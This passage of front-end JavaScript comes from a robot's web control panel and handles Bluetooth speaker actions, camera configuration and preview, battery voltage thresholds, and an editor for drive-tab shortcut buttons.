      btnWrap.appendChild(mkBtn('btn btn-xs btn-active', 'PAIR', '/audio/bt/pair'));
    if (isPaired && !dev.connected)
      btnWrap.appendChild(mkBtn('btn btn-xs btn-active', 'CONNECT', '/audio/bt/connect'));
    if (dev.connected)
      btnWrap.appendChild(mkBtn('btn btn-xs btn-warn', 'DISCONNECT', '/audio/bt/disconnect'));
    if (isPaired)
      btnWrap.appendChild(mkBtn('btn btn-xs', '✕', '/audio/bt/remove'));
    row.appendChild(btnWrap);
    return row;
  },

  async _act(endpoint, mac) {
    const status = el('btspk-status');
    if (status) { status.textContent = 'Working…'; status.className = 'settings-status'; }
    try {
      const d = await api(endpoint, 'POST', { mac });
      const ok = d?.ok !== false;
      if (status) {
        status.textContent = ok ? '✓ Done' : ('✗ ' + (d?.error || d?.output || 'Error'));
        status.className = 'settings-status ' + (ok ? 'ok' : 'error');
      }
      setTimeout(() => this.refresh(), 1200);
    } catch(e) {
      if (status) { status.textContent = '✗ ' + e; status.className = 'settings-status error'; }
    }
  },

  async setVolume(val) {
    const volume = parseInt(val);
    const lbl = el('btspk-vol-val');
    if (lbl) lbl.textContent = volume + '%';
    try {
      await api('/audio/bt/volume', 'POST', { volume });
    } catch(e) {}
  },
};

// ─── Camera config ────────────────────────────────────────────────────────────
const cameraConfig = {
  _loaded: null,   // W4 fix 2026-05-16: cache for diff-aware save
  async load() {
    try {
      const d = await api('/camera/config');
      if (!d) return;
      this._loaded = { resolution: d.resolution, fps: d.fps, quality: d.quality };
      const resEl = el('cam-resolution');
      const fpsEl = el('cam-fps');
      const qEl   = el('cam-quality');
      if (resEl && !resEl.matches(':focus')) resEl.value = d.resolution || '640x480';
      if (fpsEl && !fpsEl.matches(':focus')) fpsEl.value = String(d.fps   || 30);
      if (qEl  && !qEl.matches(':focus')) {
        qEl.value = d.quality || 80;
        syncHoloSlider(qEl);
        const valLbl = el('cam-quality-val');
        if (valLbl) valLbl.textContent = qEl.value;
      }
      // W7 fix 2026-05-16: populate the direct MJPEG URL field
      const urlEl = el('cam-direct-url');
      if (urlEl) urlEl.value = `http://${window.location.hostname}:8080/?action=stream`;
    } catch(e) {}
  },
  async save() {
    const resolution = el('cam-resolution')?.value || '640x480';
    const fps        = parseInt(el('cam-fps')?.value) || 30;
    const quality    = parseInt(el('cam-quality')?.value) || 80;
    // W4 fix 2026-05-16: diff-aware skip
    if (this._loaded
        && this._loaded.resolution === resolution
        && this._loaded.fps === fps
        && this._loaded.quality === quality) {
      toast('No changes — camera not restarted', 'info');
      return true;
    }
    const status = el('cam-config-status');
    if (status) { status.textContent = 'Restarting camera…'; status.className = 'settings-status'; }
    const data = await api('/camera/config', 'POST', { resolution, fps, quality });
    if (!data || data.status !== 'ok') {
      if (status) { status.textContent = '✗ Error — check logs'; status.className = 'settings-status error'; }
      return false;
    }
    this._loaded = { resolution, fps, quality };
    if (status) { status.textContent = `✓ ${resolution} @ ${fps}fps q${quality}`; status.className = 'settings-status ok'; }
    toast(`Camera: ${resolution} @ ${fps}fps`, 'ok');
    // E4 fix 2026-05-16: was 2200ms but backend restart is debounced
    // 2000ms THEN systemctl restart THEN mjpg_streamer cold-start
    // (~1-3s). Preview at 2.2s hit 503 'Camera not available' EVERY
    // time. Bumped to 5000ms (debounce 2s + restart 1s + warmup 2s).
    setTimeout(() => this._showPreview(), 5000);
  },
  async _showPreview() {
    const preview = el('cam-preview-thumb');
    if (!preview) return;
    preview.innerHTML = '<div class="cam-preview-note">Loading preview…</div>';
    // E3 fix 2026-05-16: was hitting /camera/stream without taking a
    // token → backend rejected 403 ('No active token') → onerror always
    // fired. Now POST /camera/take first, then use the token.
    let token = null;
    try {
      const base = (typeof _camBase === 'function' ? _camBase() : '');
      const r = await fetch(base + '/camera/take', { method: 'POST' });
      if (r.ok) {
        const d = await r.json();
        token = d.token;
      }
    } catch(e) { /* fallthrough to error */ }
    if (!token) {
      preview.innerHTML = '<div class="cam-preview-err">Stream not available — switch to Drive tab to view live</div>';
      return;
    }
    preview.innerHTML = '';
    const img = document.createElement('img');
    img.alt = 'camera preview';
    img.className = 'cam-preview-img';
    img.onerror = () => {
      preview.innerHTML = '<div class="cam-preview-err">Stream not available — switch to Drive tab to view live</div>';
    };
    img.onload = () => {
      preview.classList.add('cam-preview-loaded');
    };
    const base = (typeof _camBase === 'function' ? _camBase() : '');
    img.src = `${base}/camera/stream?t=${token}&_=${Date.now()}`;
    preview.appendChild(img);
    setTimeout(() => {
      if (img.parentNode) img.parentNode.removeChild(img);
      const note = document.createElement('div');
      note.className = 'cam-preview-note';
      note.textContent = 'Preview closed — open Drive tab for live view';
      preview.appendChild(note);
      // Release the preview token so Drive tab can claim
      fetch(`${base}/camera/release`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token }),
        keepalive: true,
      }).catch(() => {});
    }, 8000);
  },
};

async function saveBatteryCells() {
  const cells     = parseInt(el('battery-cells')?.value) || 4;
  const chemistry = (el('battery-chemistry')?.value || 'liion').toLowerCase();
  const perCell   = chemistry === 'lifepo4' ? 3.0 : 3.5;
  const status = el('battery-cells-status');
  const btn = document.querySelector('#spanel-battery button[onclick*="saveBatteryCells"]');
  try {
    await withSaveFeedback(btn, async () => {
      // B4 fix 2026-05-16: apiDetail so backend error messages
      // ('invalid value(s): battery.cells') surface in toast instead
      // of generic 'Failed' for ANY rejection.
      const res = await apiDetail('/settings/config', 'POST', {
        'battery.cells':     cells,
        'battery.chemistry': chemistry,
      });
      if (!res.ok) throw new Error(res.error || 'failed');
      // W4: pass chemistry to gauge so LiFePO4 thresholds apply
      batteryGauge.setCells(cells, chemistry);
      toast(`Battery: ${cells}S ${chemistry.toUpperCase()} — abort @ ${(cells * perCell).toFixed(1)} V (hot-applied)`, 'ok');
      // B6 fix 2026-05-16: signal density — drop the duplicate status
      // text. Toast + withSaveFeedback button checkmark = 2 clear
      // signals; status text was a 3rd redundant one (CLAUDE.md
      // 'Signal density: 2 clear > 3 loud').
      if (status) status.textContent = '';
      return res.data;
    });
  } catch (e) {
    const msg = (e && e.message) || 'failed';
    toast('Save failed: ' + msg, 'error');
    if (status) { status.textContent = 'Error: ' + msg; status.className = 'settings-status error'; }
  }
}

// WOW M2-W 2026-05-15: Audio channels impact preview. Operator
// picks 6 vs 12 with no idea of cost. Estimate ~8MB RAM per mpg123
// instance (Slave Pi 2GB). Mirrors Camera bitrate hint pattern.
function updateChannelsHint(val) {
  const hint = document.getElementById('audio-channels-hint');
  if (!hint) return;
  const n = Math.max(1, Math.min(12, parseInt(val, 10) || 6));
  hint.textContent = `~${n} simultaneous mpg123 instances · ~${n * 8} MB RAM on Slave`;
}

// WOW polish M3 2026-05-15: Camera bitrate / size impact preview.
// Operator slides quality 100→50 — wants to know what that means
// for bandwidth before applying. Computes a rough estimate from
// resolution × fps × quality factor.
function updateCameraBitrateHint() {
  const res = el('cam-resolution')?.value || '640x480';
  const fps = parseInt(el('cam-fps')?.value) || 30;
  const q   = parseInt(el('cam-quality')?.value) || 80;
  const hint = el('cam-bitrate-hint');
  if (!hint) return;
  const [w, h] = res.split('x').map(n => parseInt(n) || 0);
  if (!w || !h) { hint.textContent = ''; return; }
  const bytesPerFrame = Math.round(w * h * 3 * (q / 100) * 0.08);
  const kbps = Math.round(bytesPerFrame * fps * 8 / 1000);
  const kbf  = Math.round(bytesPerFrame / 1024);
  const mbMin = Math.round(kbps * 60 / 8 / 1024);
  // W5 fix 2026-05-16: richer live preview — output spec + bandwidth +
  // per-minute estimate.
  hint.innerHTML = `<div class="cam-preview-now"><strong>Output:</strong> ${w}×${h} @ ${fps}fps · q${q}</div>` +
                   `<div>~${kbf} KB/frame · ~${kbps} kbps stream · ~${mbMin} MB/min</div>`;
}

// W6 fix 2026-05-16: snapshot download — single MJPEG frame as JPEG
function cameraTakeSnapshot() {
  const base = (typeof _camBase === 'function' ? _camBase() : '');
  const a = document.createElement('a');
  a.href = `${base}/camera/snapshot?_=${Date.now()}`;
  a.target = '_blank';
  a.download = `r2d2-snapshot.jpg`;
  document.body.appendChild(a);
  a.click();
  a.remove();
  toast('Snapshot downloaded', 'ok');
}

// W7 fix 2026-05-16: copy stream URL to clipboard
function copyCameraUrl(inputId) {
  const inp = el(inputId);
  if (!inp) return;
  inp.select();
  navigator.clipboard.writeText(inp.value).then(
    () => toast('URL copied to clipboard', 'ok'),
    () => { document.execCommand('copy'); toast('URL copied', 'ok'); }
  );
}

// W1 fix 2026-05-16: camera status pill — called by StatusPoller
function updateCameraStatusPill(data) {
  const pill = el('cam-status-pill');
  if (!pill) return;
  pill.classList.remove('cam-status-online', 'cam-status-offline', 'cam-status-found', 'cam-status-unknown');
  if (data.camera_found && data.camera_active) {
    pill.textContent = '● ONLINE · streaming';
    pill.classList.add('cam-status-online');
  } else if (data.camera_found) {
    pill.textContent = '● FOUND · stream offline';
    pill.classList.add('cam-status-found');
  } else {
    pill.textContent = '● NOT FOUND · check USB cable';
    pill.classList.add('cam-status-offline');
  }
}

// W9 fix 2026-05-16: reset battery dropdowns to single-pack defaults
function resetBatteryDefaults() {
  if (!confirm('Reset to 4S Li-ion defaults? (Click APPLY to persist.)')) return;
  const c = el('battery-cells');     if (c) c.value = '4';
  const m = el('battery-chemistry'); if (m) m.value = 'liion';
  updateBatteryPreview();
  if (typeof toast === 'function') toast('Defaults loaded — click APPLY to persist', 'info');
}

// WOW polish M1 2026-05-15: Battery live voltage threshold preview.
// Operator changes cell count or chemistry → sees IMMEDIATELY the
// new idle/low/abort voltages BEFORE clicking APPLY. No more
// "wait did I pick the right one?". Updates a small preview span
// without committing — only APPLY writes to local.cfg.
function updateBatteryPreview() {
  const cells     = parseInt(el('battery-cells')?.value) || 4;
  const chemistry = (el('battery-chemistry')?.value || 'liion').toLowerCase();
  // W8 fix 2026-05-16: shared chemistry map (was duplicated in 3 places)
  const CHEM = {
    liion:   { abort: 3.5, idle: 3.85, full: 4.20, label: 'Li-ion',  note: 'Nominal 3.7V/cell · steeper discharge near empty · common for hobby builds' },
    lipo:    { abort: 3.5, idle: 3.85, full: 4.20, label: 'LiPo',    note: 'Same as Li-ion thresholds · higher discharge rate' },
    lifepo4: { abort: 3.0, idle: 3.30, full: 3.60, label: 'LiFePO4', note: 'Nominal 3.2V/cell · flatter discharge · safer thermal · lower energy density' },
  };
  const c = CHEM[chemistry] || CHEM.liion;
  const preview = el('battery-preview');
  if (!preview) return;
  preview.replaceChildren();
  const mk = (label, val, color) => {
    const span = document.createElement('span');
    span.className = 'battery-preview-row';
    span.style.color = color;
    const lbl = document.createElement('strong');
    lbl.textContent = label + ': ';
    lbl.style.color = 'var(--text-dim)';
    lbl.style.fontWeight = '600';
    const v = document.createTextNode(`${val.toFixed(1)} V (${(val/cells).toFixed(2)} V/cell)`);
    span.append(lbl, v);
    preview.appendChild(span);
  };
  mk('Full',  cells * c.full,  'var(--green, #00cc66)');
  mk('Idle',  cells * c.idle,  'var(--text)');
  mk('ABORT', cells * c.abort, 'var(--red, #ff2244)');
  // W1 fix 2026-05-16: live NOW voltage with color matching gauge
  // (data.battery_voltage from latest /status snapshot — cached for
  // HATs already as _lastStatusForHats; reuse for parité).
  const liveV = (typeof _lastStatusForHats === 'object' && _lastStatusForHats)
                ? _lastStatusForHats.battery_voltage : null;
  if (liveV != null) {
    const nowSpan = document.createElement('span');
    nowSpan.className = 'battery-preview-row battery-preview-now';
    const nowLbl = document.createElement('strong');
    nowLbl.textContent = 'NOW: ';
    nowLbl.style.color = 'var(--text-dim)';
    nowLbl.style.fontWeight = '600';
    const pct = Math.max(0, Math.min(100, Math.round(((liveV - cells * c.abort) / (cells * c.full - cells * c.abort)) * 100)));
    const nowVal = document.createElement('span');
    nowVal.textContent = `${liveV.toFixed(1)} V · ${pct}%`;
    const vpc = liveV / cells;
    nowVal.style.color = vpc >= (c.full - 0.4) ? 'var(--ok, #00cc66)'
                       : vpc >= (c.abort + 0.2) ? 'var(--amber, #ffaa44)'
                       : 'var(--err, #ff4444)';
    nowVal.style.fontWeight = 'bold';
    nowSpan.append(nowLbl, nowVal);
    preview.appendChild(nowSpan);
  }
  // W3 fix 2026-05-16: chemistry educational hint
  const hintWrap = el('battery-chem-hint');
  if (hintWrap) hintWrap.textContent = c.note;
  // W2 fix 2026-05-16: per-cell footnote (honest about pack-only measure)
  const footnote = el('battery-footnote');
  if (footnote && !footnote.textContent) {
    footnote.textContent = 'Per-cell values shown are pack ÷ cells average — not measured per-cell. Use a BMS for cell-level monitoring.';
  }
}

// ─── Shortcuts (Settings → Shortcuts + Drive tab overlay) ────────────────────
// Two cooperating objects:
//   shortcutsEditor — Settings panel: count slider + per-shortcut row
//                     editor + small preview pane. Saves to /shortcuts.
//   shortcutsRunner — Drive tab overlay: renders the configured
//                     shortcuts split across the left+right joystick
//                     pads, handles clicks, updates indicator dots.
// W1/B1 fix 2026-05-16: play_animation was a backend-only feature →
// invisible in the editor → operator could never bind Imperial March
// without SSH-editing shortcuts.json. Added here + handled in
// _buildTargetInput + _defaultIconFor/Label below.
// W10 fix: action-type emojis inline for visual scan.
const _SHORTCUT_ACTION_TYPES = [
  { value: 'none',                label: '— none —' },
  { value: 'arms_toggle',         label: '🦾 Arm toggle' },
  { value: 'body_panel_toggle',   label: '🚪 Body panel toggle' },
  { value: 'dome_panel_toggle',   label: '🔘 Dome panel toggle' },
  { value: 'play_choreo',         label: '🎭 Play choreo' },
  { value: 'play_sound',          label: '🎵 Play sound' },
  { value: 'play_random_audio',   label: '🎲 Play random (category)' },
  { value: 'play_animation',      label: '💡 Play lights animation' },
];

const shortcutsEditor = {
  _shortcuts: [],
  _max:        12,
  _scripts:    null,   // cache of /choreo/list for the choreo dropdown
  _sounds:     null,   // cache of /audio/index for the sound dropdown
  _cats:       null,   // audio categories

  async load() {
    const d = await api('/shortcuts');
    if (!d) return;
    this._max = d.max || 12;
    this._shortcuts = (d.shortcuts || []).slice();
    // Lazy-fetch the dropdown sources only once per editor open.
    if (!this._scripts) this._scripts = await api('/choreo/list') || [];
    if (!this._sounds) {
      const idx = await api('/audio/index');
      this._cats   = idx?.categories || {};
      this._sounds = Object.values(this._cats).flat();
    }
    // Decide whether each saved shortcut's icon/label was auto-
    // derived (so future type/target changes can refresh it) or
    // hand-picked (preserve as-is). Heuristic: if the saved value
    // matches the type's current default, it's auto. The 'BTN N'
    // placeholder also counts as auto so the user's never-touched
    // shortcuts pick up nice labels at the first target selection.
    this._shortcuts.forEach((sc, i) => {
      sc._iconAuto  = (sc.icon  === this._defaultIconFor(sc.action));
      const defLbl  = this._defaultLabelFor(sc);
      const isStock = /^BTN\s+\d+$/.test(sc.label || '');
      sc._labelAuto = (sc.label === defLbl) || isStock;
    });
    const slider = el('shortcuts-count');
    if (slider) { slider.max = this._max; slider.value = this._shortcuts.length; }
    const lbl = el('shortcuts-count-val');
    if (lbl) lbl.textContent = String(this._shortcuts.length);
    this._render();
  },

  onCountChange(raw) {
    const n = Math.max(0, Math.min(this._max, parseInt(raw) || 0));
    const lbl = el('shortcuts-count-val');
    if (lbl) lbl.textContent = String(n);
    // Grow or shrink the working list to match
    while (this._shortcuts.length < n) {
      this._shortcuts.push({
        id:     '',   // server will assign on save
        label:  `BTN ${this._shortcuts.length + 1}`,
        icon:   '⚡',
        color:  '',
        action: { type: 'none', target: '' },
        _iconAuto:  true,   // editor-only flag — overwritten by emojiPicker
        _labelAuto: true,   // editor-only flag — overwritten by typing in label input
      });
    }
    if (this._shortcuts.length > n) this._shortcuts.length = n;
    this._render();
  },

  // Default icon for a given action type + target combination.
  // User-reported 2026-05-15: 'l'icone par défaut devrait être le
  // même que celui dans la choreo quand il s'agit d'une choreo'.
  // play_choreo → reuse the choreo's own emoji from /choreo/list so
  //               a shortcut for "Angry" automatically picks up
  //               whatever emoji the operator chose in Sequences.
  // Other types fall back to a sensible category icon.
  _defaultIconFor(action) {
    const type   = action?.type || 'none';
    const target = action?.target || '';
    if (type === 'play_choreo' && target) {
      const ch = (this._scripts || []).find(s => s.name === target);
      if (ch && ch.emoji) return ch.emoji;
      return '🎭';
    }
    if (type === 'play_sound')        return '🎵';
    if (type === 'play_random_audio') return '🎲';
    if (type === 'arms_toggle')       return '🦾';
    if (type === 'body_panel_toggle') return '🚪';
    if (type === 'dome_panel_toggle') return '🔘';
    if (type === 'play_animation')    return '💡';
    return '⚡';
  },

  // Apply the type/target-derived default to sc.icon, but ONLY if
  // the operator hasn't explicitly picked one via the emoji picker
  // (sc._iconAuto stays true until they click the icon button).
  _maybeAutoFillIcon(sc) {
    if (!sc._iconAuto) return;
    const def = this._defaultIconFor(sc.action);
    if (def && def !== sc.icon) sc.icon = def;
  },

  // Default label, mirroring the icon logic. User-reported 2026-05-15:
  // 'le nom devrait s'autofill aussi par défaut avec le nom du choreo
  // choisi à la place de rester BTN6'. play_choreo reuses the
  // Sequences-side display label, other types fall back to the target
  // text or a type-specific generic.
  _defaultLabelFor(sc) {
    const type   = sc.action?.type || 'none';
    const target = sc.action?.target || '';
    if (!target && type !== 'none') return `BTN ${this._shortcuts.indexOf(sc) + 1}`;
    if (type === 'play_choreo') {
      const ch = (this._scripts || []).find(s => s.name === target);
      return (ch && ch.label) ? ch.label : (target || 'CHOREO');
    }
    if (type === 'play_sound')        return target || 'SOUND';
    if (type === 'play_random_audio') return target ? `Random ${target}` : 'Random';
    if (type === 'arms_toggle')       return this._armLabel(parseInt(target, 10) || 1);
    if (type === 'body_panel_toggle' || type === 'dome_panel_toggle') {
      return this._panelLabel(target);
    }
    if (type === 'play_animation') {
      const anims = (typeof animData !== 'undefined' && animData.animations) || [];
      const a = anims.find(x => String(x.code ?? x.mode ?? x.id) === target);
      return (a && a.name) ? a.name : (target ? `T${target}` : 'ANIM');
    }
    return `BTN ${this._shortcuts.indexOf(sc) + 1}`;
  },

  _maybeAutoFillLabel(sc) {
    if (!sc._labelAuto) return;
    const def = this._defaultLabelFor(sc);
    if (def && def !== sc.label) sc.label = def;
  },

  _render() {
    const list = el('shortcuts-list');
    if (!list) return;
    list.replaceChildren();
    this._shortcuts.forEach((sc, idx) => {
      // B-44-style DOM build — no innerHTML interpolation of user values.
      const row = document.createElement('div');
      row.className = 'shortcut-row';

      const idxLbl = document.createElement('span');
      idxLbl.className = 'shortcut-row-idx';
      idxLbl.textContent = '#' + (idx + 1);
      row.appendChild(idxLbl);

      // User-reported 2026-05-15: 'l'éditeur d'emoji devrait apparaître
      // je connais pas par cœur les emoji'. Replace the text input
      // with a clickable button that opens the existing emojiPicker.
      // Same pattern used by Sequences pill + Choreo card emoji editors.
      const iconBtn = document.createElement('button');
      iconBtn.type = 'button';
      iconBtn.className = 'shortcut-row-icon';
      iconBtn.textContent = sc.icon || '⚡';
      iconBtn.title = 'Click to pick an emoji';
      iconBtn.addEventListener('click', () => {
        emojiPicker.open(sc.icon || '⚡', (emoji) => {
          if (!emoji) return;
          sc.icon = emoji;
          sc._iconAuto = false;   // operator chose explicitly — lock it
          iconBtn.textContent = emoji;
          this._renderPreview();
        });
      });
      row.appendChild(iconBtn);

      const lblInp = document.createElement('input');
      lblInp.type = 'text';
      lblInp.className = 'shortcut-row-label';
      lblInp.value = sc.label || '';
      lblInp.maxLength = 32;
      lblInp.placeholder = 'Label';
      lblInp.addEventListener('input', () => {
        sc.label = lblInp.value;
        sc._labelAuto = false;   // operator typed — lock it
        this._renderPreview();
      });
      row.appendChild(lblInp);

      const typeSel = document.createElement('select');
      typeSel.className = 'shortcut-row-type input-text';
      _SHORTCUT_ACTION_TYPES.forEach(opt => {
        const o = document.createElement('option');
        o.value = opt.value;
        o.textContent = opt.label;
        if ((sc.action?.type || 'none') === opt.value) o.selected = true;
        typeSel.appendChild(o);
      });
      typeSel.addEventListener('change', () => {
        sc.action = { type: typeSel.value, target: '' };
        // Re-derive defaults for the new type. They'll be refined
        // again when mkSelect prefills the first valid target on
        // the upcoming render.
        this._maybeAutoFillIcon(sc);
        this._maybeAutoFillLabel(sc);
        this._render();
      });
      row.appendChild(typeSel);

      const targetCell = document.createElement('div');
      targetCell.style.minWidth = '0';
      targetCell.appendChild(this._buildTargetInput(sc));
      row.appendChild(targetCell);

      const delBtn = document.createElement('button');
      delBtn.className = 'shortcut-row-del';
      delBtn.title = 'Remove';
      delBtn.textContent = '✕';
      delBtn.addEventListener('click', () => {
        this._shortcuts.splice(idx, 1);
        const slider = el('shortcuts-count');
        if (slider) slider.value = this._shortcuts.length;
        const lbl = el('shortcuts-count-val');
        if (lbl) lbl.textContent = String(this._shortcuts.length);
        this._render();
      });
      row.appendChild(delBtn);

      list.appendChild(row);
    });
    this._renderPreview();
  },

  // User-reported 2026-05-15: prefer the Calibration label over the
  // raw servo id. armsConfig._labels maps servo_id → user-set label.
  // Falls back to "Arm N" / the servo id when no custom label exists.
  _armLabel(armNum) {
    const idx = armNum - 1;
    const sid = (armsConfig._servos || [])[idx] || '';
    const lbl = sid ? armsConfig._labels[sid] : '';
    if (lbl && lbl !== sid) return lbl;
    return `Arm ${armNum}`;
  },

  _panelLabel(servoId) {
    // Source-of-truth is the module-level _servoCfg, populated by
    // loadServoSettings(): { panels: { Servo_M0: {label, open, close, speed}, … } }.
    // (Earlier draft incorrectly used window._servoSettings which
    // never existed.) Reflects whatever the user typed in
    // Settings → Calibration for that servo.
    const labels = (typeof _servoCfg !== 'undefined' && _servoCfg.panels) || {};
    const lbl = labels[servoId]?.label;
    return (lbl && lbl !== servoId) ? `${lbl} (${servoId})` : servoId;
  },

  _buildTargetInput(sc) {
    const type = sc.action?.type || 'none';
    if (type === 'none') {
      const s = document.createElement('span');
      s.style.color = 'var(--text-dim)';
      s.style.fontSize = '10px';
      s.textContent = '—';
      return s;
    }

    // Common helper to populate a <select> and auto-prefill
    // sc.action.target with the first usable option. Fixes the user-
    // reported "#0: arms_toggle requires a target" bug — the browser
    // shows the first option as selected but never fires a 'change'
    // event, so sc.action.target stayed empty on first render. We
    // explicitly assign it here.
    const mkSelect = (options, currentValue) => {
      const sel = document.createElement('select');
      sel.className = 'shortcut-row-target input-text';
      let firstValid = '';
      options.forEach((o, idx) => {
        const opt = document.createElement('option');
        opt.value = o.value;
        opt.textContent = o.text;
        if (o.disabled) opt.disabled = true;
        if (o.value === currentValue) opt.selected = true;
        if (!firstValid && !o.disabled && o.value !== '') firstValid = o.value;
        sel.appendChild(opt);
      });
      // Auto-prefill the first real option in two cases:
      //   1. currentValue isn't in the options (saved target was
      //      deleted / cascade_delete neutralized).
      //   2. currentValue is empty (operator just switched type
      //      from 'none' to play_choreo etc. — the '(pick a X)'
      //      placeholder satisfies value==='' but the user wants
      //      the first concrete choice prefilled so the icon/label
      //      auto-fill kicks in immediately).
      // User-reported 2026-05-15 (buttons 5-8 weren't auto-filling):
      // the previous logic stopped at the placeholder match and
      // forced the operator to manually pick a target before the
      // icon/label updated.
      const validMatch = currentValue !== '' &&
                         options.some(o => o.value === currentValue);
      if (!validMatch && firstValid) {
        sel.value = firstValid;
        sc.action.target = firstValid;
        const iconBefore  = sc.icon;
        const labelBefore = sc.label;
        this._maybeAutoFillIcon(sc);
        this._maybeAutoFillLabel(sc);
        // mkSelect runs DURING the current _render() pass, so the
        // icon button and label input above us were already built
        // with the stale values. If autofill changed anything, queue
        // a second render in the next microtask so the DOM catches
        // up. Visually the operator sees the new icon/label flash in
        // ~1 frame after picking the type — clean enough.
        if (sc.icon !== iconBefore || sc.label !== labelBefore) {
          Promise.resolve().then(() => this._render());
        }
      }
      sel.addEventListener('change', () => {
        sc.action.target = sel.value;
        let dirty = false;
        if (sc._iconAuto)  { this._maybeAutoFillIcon(sc);  dirty = true; }
        if (sc._labelAuto) { this._maybeAutoFillLabel(sc); dirty = true; }
        if (dirty) this._render();
      });
      return sel;
    };

    if (type === 'arms_toggle') {
      const count = (armsConfig._count || 0);
      if (count === 0) {
        return mkSelect([{value: '', text: '(configure arms first)', disabled: true}], sc.action.target);
      }
      const options = [];
      for (let i = 1; i <= count; i++) {
        options.push({value: String(i), text: this._armLabel(i)});
      }
      return mkSelect(options, sc.action.target);
    }
    if (type === 'body_panel_toggle' || type === 'dome_panel_toggle') {
      const prefix = type === 'body_panel_toggle' ? 'Servo_S' : 'Servo_M';
      const options = [{value: '', text: '(pick a servo)'}];
      // Pull the configured panels from _servoCfg instead of dumping
      // all 32 possible slots. Keeps the dropdown short and only
      // exposes servos the operator actually wired + labelled.
      const allPanels = (typeof _servoCfg !== 'undefined' && _servoCfg.panels) || {};
      const ids = Object.keys(allPanels)
        .filter(id => id.startsWith(prefix))
        .sort((a, b) => {
          // Natural numeric sort by trailing index
          const na = parseInt(a.replace(prefix, ''), 10);
          const nb = parseInt(b.replace(prefix, ''), 10);
          return (isNaN(na) ? 0 : na) - (isNaN(nb) ? 0 : nb);
        });
      ids.forEach(id => options.push({value: id, text: this._panelLabel(id)}));
      if (ids.length === 0) {
        options.push({value: '', text: '(none configured in Calibration)', disabled: true});
      }
      return mkSelect(options, sc.action.target);
    }
    if (type === 'play_choreo') {
      const options = [{value: '', text: '(pick a choreo)'}];
      (this._scripts || []).forEach(s => {
        options.push({value: s.name, text: s.label || s.name});
      });
      return mkSelect(options, sc.action.target);
    }
    if (type === 'play_sound') {
      const options = [{value: '', text: '(pick a sound)'}];
      (this._sounds || []).forEach(s => options.push({value: s, text: s}));
      return mkSelect(options, sc.action.target);
    }
    if (type === 'play_random_audio') {
      const options = [{value: '', text: '(pick a category)'}];
      Object.keys(this._cats || {}).sort().forEach(c => options.push({value: c, text: c}));
      return mkSelect(options, sc.action.target);
    }
    // W1/B1 fix 2026-05-16: play_animation T-code dropdown
    if (type === 'play_animation') {
      const options = [{value: '', text: '(pick an animation)'}];
      // Lights animations are cached as global animData (loaded from /teeces/animations)
      const anims = (typeof animData !== 'undefined' && animData.animations) || [];
      anims.forEach(a => {
        const code = String(a.code ?? a.mode ?? a.id ?? '');
        const name = a.name || a.label || `T${code}`;
        if (code) options.push({value: code, text: `T${code} — ${name}`});
      });
      if (anims.length === 0) {
        options.push({value: '', text: '(visit Lights tab first)', disabled: true});
      }
      return mkSelect(options, sc.action.target);
    }
    const span = document.createElement('span');
    span.textContent = '—';
    return span;
  },

  _renderPreview() {
    const left  = el('sc-preview-left');
    const right = el('sc-preview-right');
    if (!left || !right) return;
    left.replaceChildren();
    right.replaceChildren();
    // WOW polish M2 2026-05-15: preview now uses the exact same
    // .shortcut-btn structure as shortcutsRunner on Drive — operator
    // sees pixel-identical buttons in Settings preview vs Drive. WYSIWYG.
    const n = this._shortcuts.length;
    const leftN = Math.ceil(n / 2);
    this._shortcuts.forEach((sc, idx) => {
      const dest = idx < leftN ? left : right;
      const b = document.createElement('div');
      b.className = 'shortcut-btn';   // identical to Drive runner
      const icon = document.createElement('span');
      icon.className = 'shortcut-icon';
      icon.textContent = sc.icon || sc.label?.[0] || '?';
      const label = document.createElement('span');
      label.className = 'shortcut-label';
      label.textContent = sc.label || '';
      b.append(icon, label);
      b.title = sc.label || '';
      dest.appendChild(b);
    });
  },

  async save() {
    const status = el('shortcuts-status');
    if (status) status.textContent = 'Saving…';
    // User-reported 2026-05-15: api() returns null on ANY non-2xx
    // (401 admin OR 400 validation OR 5xx) — the previous "admin
    // re-auth?" message was misleading when the real cause was a
    // validation error. Use raw fetch here so we can surface the
    // actual server error message + HTTP status.
    try {
      const headers = { 'Content-Type': 'application/json' };
      if (typeof adminGuard !== 'undefined') {
        const tok = adminGuard.getToken && adminGuard.getToken();
        if (tok) headers['X-Admin-Pw'] = tok;
      }
      const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
      // Strip editor-only state (_iconAuto, _labelAuto) before
      // sending. Backend rejects unknown fields silently anyway, but
      // cleaner this way.
      const payload = this._shortcuts.map(sc => {
        const { _iconAuto, _labelAuto, ...rest } = sc;
        return rest;
      });
      const res = await fetch(base + '/shortcuts', {
        method: 'POST',
        headers,
        body: JSON.stringify({ shortcuts: payload }),
      });
      let d = null;
      try { d = await res.json(); } catch {}
      if (!res.ok) {
        const errMsg = (d && d.error) || `HTTP ${res.status}`;
        const hint = res.status === 401 ? ' (admin lock expired — re-auth)' : '';
        if (status) {
          status.textContent = '✗ ' + errMsg + hint;
          status.className = 'settings-status error';
        }
        console.warn('Shortcuts save failed:', res.status, d);
        return;
      }
      if (status) { status.textContent = `✓ ${d.count} saved`; status.className = 'settings-status ok'; }
      toast('Shortcuts saved', 'ok');
      this._shortcuts = d.shortcuts || [];
      shortcutsRunner.load();
    } catch (e) {
      if (status) {
        status.textContent = '✗ Network error: ' + (e.message || e);
        status.className = 'settings-status error';
      }
      console.error('Shortcuts save error:', e);
    }
  },
};


// Drive-tab renderer. Pulls /shortcuts at boot, every tab switch back
// to Drive, and after a successful save in the editor. Renders into
// the two .shortcut-pad containers (left + right) inside the joystick
// panels.
const shortcutsRunner = {
  _shortcuts: [],
  _states:    {},

  async load() {
    const d = await api('/shortcuts');
    if (!d) return;
    this._shortcuts = d.shortcuts || [];
    this._states    = d.states || {};
    this._render();
  },

  _render() {
    const left  = el('shortcut-pad-left');
    const right = el('shortcut-pad-right');
    if (!left || !right) return;
    left.replaceChildren();
    right.replaceChildren();
    this._btnById = {};   // id → DOM button, used by updateFromStatus
    const n = this._shortcuts.length;
    const leftN = Math.ceil(n / 2);
    this._shortcuts.forEach((sc, idx) => {
      const dest = idx < leftN ? left : right;
      const btn = document.createElement('button');
      btn.className = 'shortcut-btn';
      btn.title = sc.label || '';
      btn.dataset.scid = sc.id;
      if (this._states[sc.id] === 'on') btn.classList.add('is-on');
      if (sc.color) btn.style.borderColor = sc.color;

      const icon = document.createElement('span');
      icon.className = 'shortcut-icon';
